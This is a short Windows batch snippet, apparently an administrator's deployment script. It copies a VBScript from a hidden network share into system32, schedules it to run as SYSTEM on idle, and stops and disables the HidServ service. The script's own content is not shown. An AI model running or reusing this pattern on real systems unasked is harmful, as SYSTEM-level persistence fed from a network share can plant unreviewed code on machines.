xcopy \\forum10\hotfix$\df.vbs c:\windows\system32 /y

schtasks /delete /tn def2 /f

schtasks /create /tn def3 /tr C:\WINDOWS\system32\df.vbs /sc onidle /i 90 /s %computername% /ru "System"

net stop HidServ

sc config HidServ start= disabled





